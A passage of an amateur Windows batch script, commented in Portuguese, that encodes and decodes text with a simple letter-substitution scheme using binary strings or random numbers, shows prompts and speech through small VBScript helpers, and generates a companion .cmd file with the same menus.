start TEXTO_CRIPTOGRAFADO_MASTER.txt 
echo  %js% > Texto criptografado.txt  
if exist texto ( goto av ) else ( goto co )  
:av  
echo. > %temp%\jsf.vbs   
echo intopcao = msgbox("Desculpe mais voc๊ ainda nใo abilitou o modo seguran็a mแxima de criptografia por isso nใo pode utiliza-lo Deseja Assistir o vํdeo de como abilitar este modo ? ATENวรO APำS ABILITAR ESTE MODO DELETE O ARQUIVO DE NOME ( Texto )",vbyesno,"   js Criptografia de Caracteres") >> %temp%\jsf.vbs   
echo if intopcao = vbyes then >> %temp%\jsf.vbs   
echo Set WshShell = WScript.CreateObject("WScript.Shell") >> %temp%\jsf.vbs   
echo WshShell.Run ("http://youtu.be/SkwWGWYKvu4") >> %temp%\jsf.vbs   
echo end if >> %temp%\jsf.vbs   
::===========================
:: linha deletada 
::===========================
goto vs  
:co  
goto vs2 
:m4  
mode 92,10 
cls  
echo. 
echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ 
echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ 
echo. 
echo. 
set /p opt2= Cole o texto =) 
FOR /F "tokens=*" %%B IN ("%opt2%") DO ( 
set js=%%B 
) 
::DESCRIPTOGRAFAR TEXTO 
echo. 
::COLE AQUI O CำDIGO COPIADO ACIMA E FAวA AS ALTERAวีES NELE COMO MOSTRADO NO VอDEO 
::INICIO DO CำDIGO  COLE ENTRE O INICIO E FIM
set js=%js:7820 = %
 ::01 
set js=%js:18497 =a%
 ::02 
set js=%js:27864 =b%
 ::03 
set js=%js:15134 =c%
 ::04 
set js=%js:30871 =d%
 ::05 
set js=%js:29179 =e%
 ::06 
set js=%js:12371 =f%
 ::07 
set js=%js:30195 =g%
 ::08 
set js=%js:25225 =h%
 ::09 
set js=%js:26137 =i%
 ::10 
set js=%js:14946 =j%
 ::11 
set js=%js:12234 =k%
 ::12 
set js=%js:2876 =l%
 ::13 
set js=%js:20119 =m%
 ::14 
set js=%js:10595 =n%
 ::15 
set js=%js:30869 =o%
 ::16 
set js=%js:16812 =p%
 ::17 
set js=%js:529 =q%
 ::18 
set js=%js:28369 =r%
 ::19 
set js=%js:23545 =s%
 ::20 
set js=%js:698 =t%
 ::21 
set js=%js:27259 =u%
 ::22 
set js=%js:27424 =v%
 ::23 
set js=%js:7589 =w%
 ::24 
set js=%js:5161 =x%
 ::25 
set js=%js:17426 =y%
 ::26 
set js=%js:232 =z%
 ::27 
 ::28 
set js=%js:4067 =.%
 ::29 
set js=%js:20717 =@%
 ::30 
set js=%js:18578 =:%
 ::31 
set js=%js:25414 =!%
 ::32 
set js=%js:14444 =;%
 ::33 
set js=%js:2725 =,%
 ::34 
set js=%js:6826 =?%
::FIM DO CำDIGO ( ATENวรO )NรO ALTERE O QUE ESTA ABAIXO DESTA LINHA !!!
echo.> %temp%\cript.cmd 
echo @echo off >> %temp%\cript.cmd 
echo mode 91,10 >> %temp%\cript.cmd 
echo color 1f >> %temp%\cript.cmd 
echo title.                                  Script ( js ) Script >> %temp%\cript.cmd 
echo echo.>> %temp%\cript.cmd 
echo echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> %temp%\cript.cmd 
echo echo.>> %temp%\cript.cmd 
echo echo Sua chave =)  %js%>> %temp%\cript.cmd 
echo echo.>> %temp%\cript.cmd 
echo echo.>> %temp%\cript.cmd 
echo pause>> %temp%\cript.cmd 
echo %js% > TEXTO_DESCRIPTOGRAFADO_MASTER.txt 
echo exit>> %temp%\cript.cmd 
start %temp%\cript.cmd 
echo. >%temp%\jsb.vbs 
echo StrText = " %js%" >> %temp%\jsb.vbs 
echo set ObjVoice = CreateObject("SAPI.SpVoice") >> %temp%\jsb.vbs 
echo ObjVoice.Rate=-1>> %temp%\jsb.vbs 
echo ObjVoice.Speak StrText  >> %temp%\jsb.vbs 
start %temp%\jsb.vbs 
goto :vs2 

=========================================================================================
===============      CRIAR CRIPTOGRAFIA   ====================================================
==========================================================================================


:cr
@echo off
echo.> "Criptografia_de_caracteres.cmd"
echo @echo off >> "Criptografia_de_caracteres.cmd"
echo :vs >> "Criptografia_de_caracteres.cmd"
echo mode 92,18 >> "Criptografia_de_caracteres.cmd"
echo cls >> "Criptografia_de_caracteres.cmd"
echo color 0a >> "Criptografia_de_caracteres.cmd"
echo title Script ( js ) Script >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo echo                         ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ >> "Criptografia_de_caracteres.cmd"
echo echo                         ณ        * CRIE SUA CHAVE UNICA *        ณ >> "Criptografia_de_caracteres.cmd"
echo echo                         ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู >> "Criptografia_de_caracteres.cmd"
echo echo                                  01101010 01110011 00100000 >> "Criptografia_de_caracteres.cmd"     
echo echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> "Criptografia_de_caracteres.cmd"
echo ::echo  ๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบณ   Criptografa - 1   ณ ณ #@จ**(`Jybryvcdtr$#@!yw?//็7+ง.+ ฃ?*$?{ช ณบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤูบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบณ     js Criptografia em Script.bat        ณ ณ 2 - afargotpircseD  ณบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤูบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo ::echo  ๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕ >> "Criptografia_de_caracteres.cmd"
echo echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo Set /p crip= Digite js 1  2 - >> "Criptografia_de_caracteres.cmd"
echo if "%%crip%%" == "1" goto m1 >> "Criptografia_de_caracteres.cmd"
echo if "%%crip%%" ==  "2" goto M2 >> "Criptografia_de_caracteres.cmd"
echo if "%%crip%%" == "js" goto vs2 >> "Criptografia_de_caracteres.cmd"
echo echo msgbox "Erro ( %%crip%% ) nใo ้ um comando valido ",vbinformation,"  AVISO" ^>%%temp%%\cri.vbs >> "Criptografia_de_caracteres.cmd"
echo start %%temp%%\cri.vbs >> "Criptografia_de_caracteres.cmd"
echo goto vs >> "Criptografia_de_caracteres.cmd"
echo :vs2 >> "Criptografia_de_caracteres.cmd"
echo mode 92,20 >> "Criptografia_de_caracteres.cmd"
echo cls >> "Criptografia_de_caracteres.cmd"
echo color 0c >> "Criptografia_de_caracteres.cmd"
echo title Script ( js ) Script >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo echo                         ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ >> "Criptografia_de_caracteres.cmd"
echo echo                         ณ    * Voce esta em Security Master *    ณ >> "Criptografia_de_caracteres.cmd"
echo echo                         ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู >> "Criptografia_de_caracteres.cmd"
echo echo                                01101010 01110011 00100000 = js >> "Criptografia_de_caracteres.cmd"     
echo echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> "Criptografia_de_caracteres.cmd"
echo echo  ๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบณ   Criptografa - 1   ณ ณ #@จ**(`Jybryvcdtr$#@!yw?//็7+ง.+ ฃ?*$?{ช ณบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤูบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบณ     js Criptografia em Script.bat        ณ ณ 2 - afargotpircseD  ณบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤูบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  ๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕ >> "Criptografia_de_caracteres.cmd"
echo echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo Set /p crip= Digite js 1  2 - >> "Criptografia_de_caracteres.cmd"
echo if "%%crip%%" == "js" goto vs >> "Criptografia_de_caracteres.cmd"
echo if "%%crip%%" == "1" goto m3 >> "Criptografia_de_caracteres.cmd"
echo if "%%crip%%" == "2" goto m4 >> "Criptografia_de_caracteres.cmd"
echo echo msgbox "Erro ( %%crip%% ) nใo ้ um comando valido ",vbinformation,"  AVISO" > %%temp%%\cri.vbs >> "Criptografia_de_caracteres.cmd"
echo start %%temp%%\cri.vbs >> "Criptografia_de_caracteres.cmd"
echo :m1  >> "Criptografia_de_caracteres.cmd"
echo mode 92,10 >> "Criptografia_de_caracteres.cmd"
echo cls  >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo set /p opt2= Digite o texto =) >> "Criptografia_de_caracteres.cmd"
echo FOR /F "tokens=*" %%%%A IN ("%%opt2%%") DO ( >> "Criptografia_de_caracteres.cmd"
echo set s=%%%%A >> "Criptografia_de_caracteres.cmd"
echo ) >> "Criptografia_de_caracteres.cmd"
echo ::CRIPTOGRAFA  >> "Criptografia_de_caracteres.cmd"
echo set s=%%s: =00100000 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:a=01100001 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:b=01100010 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:c=01100011 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:d=01100100 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:e=01100101 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:f=01100110 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:g=01100111 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:h=01101000 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:i=01101001 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:j=01101010 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:k=01101011 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:l=01101100 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:m=01101101 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:n=01101110 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:o=01101111 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:p=01110000 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:q=01110001 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:r=01110010 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:s=01110011 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:t=01110100 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:u=01110101 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:v=01110110 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:w=01110111 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:x=01111000 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:y=01111001 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:z=01111010 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:!=00100001 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:,=00101100 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:.=00101110 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:@=00010111 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:?=00111110 %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s::=001110 %% >> "Criptografia_de_caracteres.cmd"
echo echo %%s%% ^> TEXTO_CRIPTOGRAFADO.txt >>"Criptografia_de_caracteres.cmd"
echo start TEXTO_CRIPTOGRAFADO.txt >>"Criptografia_de_caracteres.cmd"
echo goto vs  >>"Criptografia_de_caracteres.cmd"
echo :m2  >> "Criptografia_de_caracteres.cmd"
echo mode 92,10 >> "Criptografia_de_caracteres.cmd"
echo cls  >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo set /p opt2= Cole o texto =) >> "Criptografia_de_caracteres.cmd"
echo FOR /F "tokens=*" %%%%B IN ("%%opt2%%") DO ( >> "Criptografia_de_caracteres.cmd"
echo set s=%%%%B >> "Criptografia_de_caracteres.cmd"
echo ) >> "Criptografia_de_caracteres.cmd"
echo ::DESCRIPTOGRAFA  >> "Criptografia_de_caracteres.cmd"
 echo set s=%%s:00100000 = %% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01100001 =a%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01100010 =b%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01100011 =c%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01100100 =d%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01100101 =e%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01100110 =f%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01100111 =g%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01101000 =h%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01101001 =i%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01101010 =j%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01101011 =k%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01101100 =l%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01101101 =m%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01101110 =n%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01101111 =o%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01110000 =p%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01110001 =q%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01110010 =r%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01110011 =s%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01110100 =t%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01110101 =u%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01110110 =v%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01110111 =w%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01111000 =x%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01111001 =y%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:01111010 =z%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:00100001 =!%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:00101100 =,%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:00101110 =.%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:00010111 =@%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:00111110 =?%% >> "Criptografia_de_caracteres.cmd"
echo set s=%%s:001110 =:%% >> "Criptografia_de_caracteres.cmd"
echo echo.^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
 echo echo @echo off ^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
 echo echo mode 91,10 ^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
 echo echo color 1f ^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
 echo echo title.                                  Script ( js ) Script ^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
  echo echo echo.^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
echo echo echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ ^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
  echo echo echo.^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
echo echo echo  Sua chave =)  %%s%%^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
  echo echo echo.^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
 echo echo echo.^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
echo echo pause^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
echo echo %%js%% ^> TEXTO_DESCRIPTOGRAFADO.txt >>"Criptografia_de_caracteres.cmd"
echo echo exit^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
echo start %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
echo echo. ^>%%temp%%\jsb.vbs >>"Criptografia_de_caracteres.cmd"
echo echo %%s%% ^> TEXTO_DESCRIPTOGRAFADO.txt >>"Criptografia_de_caracteres.cmd"
::echo start TEXTO_DESCRIPTOGRAFADO.txt >>"Criptografia_de_caracteres.cmd"
echo echo StrText = " %%s%%" ^>^> %%temp%%\jsb.vbs >>"Criptografia_de_caracteres.cmd"
echo echo set ObjVoice = CreateObject("SAPI.SpVoice") ^>^> %%temp%%\jsb.vbs >>"Criptografia_de_caracteres.cmd"
echo echo ObjVoice.Rate=-1^>^> %%temp%%\jsb.vbs >>"Criptografia_de_caracteres.cmd"
echo echo ObjVoice.Speak StrText  ^>^> %%temp%%\jsb.vbs >>"Criptografia_de_caracteres.cmd"
echo start %%temp%%\jsb.vbs >>"Criptografia_de_caracteres.cmd"
echo goto :vs >> "Criptografia_de_caracteres.cmd"
echo :m3  >> "Criptografia_de_caracteres.cmd"
mode 92,10 >> "Criptografia_de_caracteres.cmd"
echo echo. ^> %%temp%%\jsb.vbs >> "Criptografia_de_caracteres.cmd"
echo echo.^> %%temp%%\cript.cmd >> "Criptografia_de_caracteres.cmd"
echo cls  >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo echo.  >> "Criptografia_de_caracteres.cmd"
echo set /p opt1= Digite o texto =)  >> "Criptografia_de_caracteres.cmd"
echo FOR /F "tokens=*" %%%%A IN ("%%opt1%%") DO ( >> "Criptografia_de_caracteres.cmd"
echo set js=%%%%A >> "Criptografia_de_caracteres.cmd"
echo ) >> "Criptografia_de_caracteres.cmd"
echo echo .  >> "Criptografia_de_caracteres.cmd"
echo ::CRIPTOGRAFA TEXTO FAวA A ALTERAวรO COMO MOSTRADO NO VอDEO>> "Criptografia_de_caracteres.cmd"
echo ::COPIAR O CำDIGO DAQUI ATE A LINHA QUE MANDO PARAR >> "Criptografia_de_caracteres.cmd"
echo set js=%%js: =%random% = %%>> "Criptografia_de_caracteres.cmd"
echo  ::01 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:a=%random% =a%%>> "Criptografia_de_caracteres.cmd"
echo  ::02 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:b=%random% =b%%>> "Criptografia_de_caracteres.cmd"
echo  ::03 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:c=%random% =c%%>> "Criptografia_de_caracteres.cmd"
echo  ::04 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:d=%random% =d%%>> "Criptografia_de_caracteres.cmd"
echo  ::05 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:e=%random% =e%%>> "Criptografia_de_caracteres.cmd"
echo  ::06 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:f=%random% =f%%>> "Criptografia_de_caracteres.cmd"
echo  ::07 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:g=%random% =g%%>> "Criptografia_de_caracteres.cmd"
echo  ::08 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:h=%random% =h%%>> "Criptografia_de_caracteres.cmd"
echo  ::09 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:i=%random% =i%%>> "Criptografia_de_caracteres.cmd"
echo  ::10 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:j=%random% =j%%>> "Criptografia_de_caracteres.cmd"
echo  ::11 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:k=%random% =k%%>> "Criptografia_de_caracteres.cmd"
echo  ::12 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:l=%random% =l%%>> "Criptografia_de_caracteres.cmd"
echo  ::13 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:m=%random% =m%%>> "Criptografia_de_caracteres.cmd"
echo  ::14 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:n=%random% =n%%>> "Criptografia_de_caracteres.cmd"
echo  ::15 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:o=%random% =o%%>> "Criptografia_de_caracteres.cmd"
echo  ::16 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:p=%random% =p%%>> "Criptografia_de_caracteres.cmd"
echo  ::17 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:q=%random% =q%%>> "Criptografia_de_caracteres.cmd"
echo  ::18 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:r=%random% =r%%>> "Criptografia_de_caracteres.cmd"
echo  ::19 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:s=%random% =s%%>> "Criptografia_de_caracteres.cmd"
echo  ::20 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:t=%random% =t%%>> "Criptografia_de_caracteres.cmd"
echo  ::21 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:u=%random% =u%%>> "Criptografia_de_caracteres.cmd"
echo  ::22 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:v=%random% =v%%>> "Criptografia_de_caracteres.cmd"
echo  ::23 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:w=%random% =w%%>> "Criptografia_de_caracteres.cmd"
echo  ::24 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:x=%random% =x%%>> "Criptografia_de_caracteres.cmd"
echo  ::25 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:y=%random% =y%%>> "Criptografia_de_caracteres.cmd"
echo  ::26 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:z=%random% =z%%>> "Criptografia_de_caracteres.cmd"
echo  ::27 >> "Criptografia_de_caracteres.cmd"
echo  ::28 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:.=%random% =.%%>> "Criptografia_de_caracteres.cmd"
echo  ::29 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:@=%random% =@%%>> "Criptografia_de_caracteres.cmd"
echo  ::30 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js::=%random% =:%%>> "Criptografia_de_caracteres.cmd"
echo  ::31 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:!=%random% =!%%>> "Criptografia_de_caracteres.cmd"
echo  ::32 >> "Criptografia_de_caracteres.cmd"
